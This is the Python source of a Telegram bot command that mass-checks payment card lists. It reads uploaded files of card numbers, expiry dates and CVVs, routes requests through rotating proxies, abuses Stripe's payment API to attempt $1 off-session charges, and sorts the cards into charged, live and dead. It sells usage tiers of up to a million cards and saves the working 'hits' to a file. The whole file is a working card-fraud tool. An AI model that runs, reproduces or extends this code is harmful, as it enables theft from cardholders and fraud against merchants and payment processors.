import re
import aiohttp
import json
import os
import random
import string
import asyncio
from CARD3D import app
from pyrogram import filters
from CARD3D.modules import sk_set
from pyrogram.enums import ParseMode
from CARD3D.core.mongo import has_premium_access, get_user, update_user, LEVELS
from config import OWNER_ID
from CARD3D.modules.proxies import proxies


PLAN_LIMITS = {
    "Free": 200,
    "Bronze": 2000,
    "Silver": 5000,
    "Gold": 10000,
    "Platinum": 22500,
    "Diamond": 30000,
    "STRIPEHIT": 1000000,
}

DEFAULT_FREQUENCY = 30
amount = 1
MAX_RETRIES = 50
RETRY_DELAY = 1

def generate_short_id():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

async def check_card(session, card_info):
    try:
        card = card_info.strip()
        if not card:
            return f"❌ **Invalid card details** for `{card_info}`"

        proxy_url = await proxies()

        split = re.split(r"[|/:]", card)
        if len(split) != 4:
            return f"❌ **Invalid card details** for `{card}`"

        cc, mes, ano, cvv = split

        token_data = {
            'type': 'card',
            "card[number]": cc,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "card[cvc]": cvv,
        }

        headers = {
            "Authorization": f"Bearer {sk_set.pk}",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        for attempt in range(MAX_RETRIES):
            try:
                async with session.post("https://api.stripe.com/v1/payment_methods", data=token_data, headers=headers, proxy=proxy_url) as response:
                    if response.status == 200:
                        token_data = await response.json()
                        token_id = token_data.get("id", "")
                        if not token_id:
                            return f"❌ **Token creation failed** for `{card}`: No token ID received"
                        break
                    else:
                        error_message = (await response.json()).get("error", {}).get("message", "Unknown error")
                        if response.status == 429 or "Request rate limit exceeded" in error_message:
                            if attempt < MAX_RETRIES - 1:
                                await asyncio.sleep(RETRY_DELAY)
                            else:
                                return f"𝗖𝗮𝗿𝗱: `{card}`\n𝗦𝘁𝗮𝘁𝘂𝘀: Declined ❌\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {error_message}"
                        else:
                            return f"𝗖𝗮𝗿𝗱: `{card}`\n𝗦𝘁𝗮𝘁𝘂𝘀: Declined ❌\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {error_message}"
            except aiohttp.ClientError as e:
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(RETRY_DELAY)
                    continue
                return f"❌ **Network error with card `{cc}` after {attempt + 1} attempts: {str(e)}**"

        charge_data = {
            "amount": amount * 100,
            "currency": "usd",
            'payment_method_types[]': 'card',
            "description": "Charge for product/service",
            'payment_method': token_id,
            'confirm': 'true',
            'off_session': 'true'
        }

        headers = {
            "Authorization": f"Bearer {sk_set.sk}",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        async with session.post(
            "https://api.stripe.com/v1/payment_intents",
            data=charge_data,
            headers=headers,
            proxy=proxy_url
        ) as response:
            charges = await response.text()

        try:
            charges_dict = json.loads(charges)
            charge_error = charges_dict.get("error", {}).get("decline_code", "Unknown error")
            charge_message = charges_dict.get("error", {}).get("message", "No message available")
        except json.JSONDecodeError:
            charge_error = "Unknown error (Invalid JSON response)"
            charge_message = "No message available"

        if '"status": "succeeded"' in charges:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            resp = f"Charged 1$🔥"
        elif '"cvc_check": "pass"' in charges:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
            resp = "CVV Live✅"
        elif "insufficient_funds" in charges:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            resp = "Insufficient funds 💰"
        elif '"code": "incorrect_cvc"' in charges:
            status = "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲 ❎"
            resp = "Your card's security code is incorrect."
        elif "transaction_not_allowed" in charges:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
            resp = "Card Doesn't Support Purchase ❎"
        elif "authentication_required" in charges or "card_error_authentication_required" in charges:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
            resp = "3D Secured❎"
        elif "requires_action" in charges or '"status": "requires_action"' in charges:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
            resp = "3D Secured❎"
        elif '"code": "rate_limit"' in charges:
            status = "Rate Limit ⚠️"
            resp = "Request rate limit exceeded"
        elif "generic_decline" in charges:
            status = "Declined ❌"
            resp = "Generic Decline"
        elif "fraudulent" in charges:
            status = "Declined ❌"
            resp = "Fraudulent"
        elif "do_not_honor" in charges:
            status = "Declined ❌"
            resp = "Do Not Honor"
        elif "invalid_expiry_month" in charges:
            status = "Declined ❌"
            resp = "The card expiration date provided is invalid."
        elif "invalid_account" in charges:
            status = "Declined ❌"
            resp = "The account linked to the card is invalid."
        elif "lost_card" in charges:
            status = "Declined ❌"
            resp = "The card has been reported as lost and the transaction was declined."
        elif "stolen_card" in charges:
            status = "Declined ❌"
            resp = "The card has been reported as stolen and the transaction was declined."
        elif "pickup_card" in charges:
            status = "Declined ❌"
            resp = "Pickup Card"
        elif "Your card has expired." in charges:
            status = "Declined ❌"
            resp = "Expired Card"
        elif "card_decline_rate_limit_exceeded" in charges:
            status = "Declined ❌"
            resp = "Rate limit"
        elif '"code": "processing_error"' in charges:
            status = "Declined ❌"
            resp = "Processing error"
        elif '"message": "Your card number is incorrect."' in charges:
            status = "Declined ❌"
            resp = "Your card number is incorrect."
        elif "incorrect_number" in charges:
            status = "Declined ❌"
            resp = "Card number is invalid."
        elif "testmode_charges_only" in charges:
            status = "Declined ❌"
            resp = "The SK key is in test mode or invalid. Please use a valid key."
        elif "api_key_expired" in charges:
            status = "Declined ❌"
            resp = "The API key used for the transaction has expired."
        elif "parameter_invalid_empty" in charges:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
            resp = "Please enter valid card details to check."
        else:
            status = f"{charge_error}"
            resp = f"{charge_message}"

        return f"𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"

    except Exception as e:
        return f"❌ **Error processing card `{card_info}`: {str(e)}**"

async def check_cards_in_batches(cards_info):
    async with aiohttp.ClientSession() as session:
        tasks = [check_card(session, card) for card in cards_info]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return results

async def handle_cards(client, message, cards_info, unique_id, user_plan, user_plan_symbol, FREQ):
    user = message.from_user
    profile_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
    fullname = f"{user.first_name} {user.last_name or ''}".strip()

    processing_msg = await message.reply_text(
        f"**Gate** ➜ 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗕𝗮𝘀𝗲𝗱 𝟭$\n\n"
        f"**Total CC Input** ➜ {len(cards_info)}\n"
        f"**Response** ➜ This response will update after {FREQ} cards check...\n"
        f"**Status** ➜ Processing ■□□□\n\n"
        f"**Charge Cards** ➜ 0\n"
        f"**Live Cards** ➜ 0\n"
        f"**Dead** ➜ 0\n"
        f"**Total Checked cards** ➜ 0\n\n"
        f"**sᴇᴄʀᴇᴛ ᴋᴇʏ** ➜ `{unique_id}`\n"
        f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link}) ⤿ {user_plan} {user_plan_symbol} ⤾\n",
        disable_web_page_preview=True,
    )

    live_cards = []
    charge_cards = []
    charge_cards_count = 0
    live_cards_count = 0
    dead_cards_count = 0
    total_checked_cards = 0
    last_response = ""
    animation_states = ["■□□□", "■■□□", "■■■□", "■■■■"]
    update_frequency = FREQ

    for i in range(0, len(cards_info), update_frequency):
        batch = cards_info[i:i + update_frequency]
        results = await check_cards_in_batches(batch)

        for result in results:
            total_checked_cards += 1
            if isinstance(result, Exception):
                last_response = f"Error: {str(result)}"
                dead_cards_count += 1
            else:
                last_response = result
                if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" in result:
                    charge_cards_count += 1
                    charge_cards.append(result)
                elif "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅" in result or "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲 ❎" in result:
                    live_cards_count += 1
                    live_cards.append(result)
                else:
                    dead_cards_count += 1

        animation = animation_states[(total_checked_cards // update_frequency) % len(animation_states)]

        await asyncio.sleep(5)

        await client.edit_message_text(
            chat_id=message.chat.id,
            message_id=processing_msg.id,
            text=(
                f"**Gate** ➜ 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗕𝗮𝘀𝗲𝗱 𝟭$\n\n"
                f"**Total CC Input** ➜ {len(cards_info)}\n"
                f"**Response** ➜ {last_response}\n"
                f"**Status** ➜ Processing {animation}\n\n"
                f"**Charge Cards** ➜ {charge_cards_count}\n"
                f"**Live Cards** ➜ {live_cards_count}\n"
                f"**Dead** ➜ {dead_cards_count}\n"
                f"**Total Checked cards** ➜ {total_checked_cards}\n\n"
                f"**sᴇᴄʀᴇᴛ ᴋᴇʏ** ➜ `{unique_id}`\n"
                f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link}) ⤿ {user_plan} {user_plan_symbol} ⤾\n"
            ),
            disable_web_page_preview=True,
        )

    if live_cards_count or charge_cards_count:
        final_message = (
            f"**Total cards** ➜ {len(cards_info)}\n"
            f"**Charge Cards** ➜ {charge_cards_count}\n"
            f"**Live Cards** ➜ {live_cards_count}\n"
            f"**Dead** ➜ {dead_cards_count}\n"
            f"**Status** ➜ Checked All ✅\n\n"
            f"**Get Live Cards** ➜ `/gethits xvvtxt_{unique_id}`\n"
            f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link}) ⤿ {user_plan} {user_plan_symbol} ⤾"
        )
    else:
        final_message = (
            f"**Total cards** ➜ {len(cards_info)}\n"
            f"**Charge Cards** ➜ {charge_cards_count}\n"
            f"**Live Cards** ➜ {live_cards_count}\n"
            f"**Dead** ➜ {dead_cards_count}\n"
            f"**Status** ➜ Checked All ✅\n\n"
            f"**Result** ➜ __No Live Cards Found__\n"
            f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link}) ⤿ {user_plan} {user_plan_symbol} ⤾"
        )

    await processing_msg.delete()
    await message.reply_text(final_message, disable_web_page_preview=True)

    if live_cards_count or charge_cards_count:
        file_name = f"live_and_charge_cards_{unique_id}.txt"
        temp_file_path = os.path.join(os.getcwd(), file_name)

        with open(temp_file_path, "w") as temp_file:
            if charge_cards_count:
                temp_file.write("Charge Cards:\n")
                temp_file.write("\n".join(charge_cards) + "\n\n")
            if live_cards_count:
                temp_file.write("Live Cards:\n")
                temp_file.write("\n".join(live_cards) + "\n")

        os.environ[f'LIVE_AND_CHARGE_CARDS_FILE_{unique_id}'] = temp_file_path

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

@app.on_message(filters.command("xvvtxt", prefixes=[".", "/"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    has_access, access_msg, user_plan = await has_premium_access(user_id, chat_id, required_credits=0)
    if not has_access:
        await message.reply_text(access_msg, parse_mode=ParseMode.MARKDOWN)
        return

    user = await get_user(user_id)
    if not user:
        await message.reply_text("❌ **You are not registered. Please register using  /register in private.**", parse_mode=ParseMode.MARKDOWN)
        return

    user_plan = user.get("plan", "Free")
    user_credits = user.get("credits", 0)
    user_plan_symbol = LEVELS.get(user_plan, {}).get('symbol', '')

    if user_id == OWNER_ID:
        user_plan = "STRIPEHIT"
        user_plan_symbol = LEVELS["STRIPEHIT"]["symbol"]
        user_credits = -1

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text("Please reply to a text file with the `/xvvtxt` command.")
        return

    if message.reply_to_message.document.mime_type == "text/plain":
        try:
            file_path = await message.reply_to_message.download()
            with open(file_path, "r") as f:
                cards_info = f.read().splitlines()
            os.remove(file_path)
        except Exception as e:
            await message.reply_text(f"Failed to download or read the file: {str(e)}")
            return

        if not sk_set.sk or not sk_set.pk:
            await message.reply("Secret keys are not set. Please set them first.")
            return

        plan_limit = PLAN_LIMITS.get(user_plan, 0)
        if len(cards_info) > plan_limit:
            if user_plan == "Free":
                await message.reply_text(
                    "⚠️ **You've exceeded the limit for Free users. Please buy a premium plan to increase limits. Use /premium for more info about premium**",
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True
                )
            else:
                await message.reply_text(
                    f"⚠️ **You've exceeded your plan's limit. Plan {user_plan} has a limit of {plan_limit} cards.**",
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True
                )
            return

        FREQ = min(sk_set.frequency, len(cards_info)) if sk_set.frequency is not None else DEFAULT_FREQUENCY

        if cards_info:
            unique_id = generate_short_id()
            asyncio.create_task(handle_cards(client, message, cards_info, unique_id, user_plan, user_plan_symbol, FREQ))
        else:
            await message.reply_text("No card found in the document.")
    else:
        await message.reply_text("Please upload a plain text (.txt) file.")

    if user_id != OWNER_ID:
        new_credits = user_credits - 1
        await update_user(user_id, {"credits": new_credits})
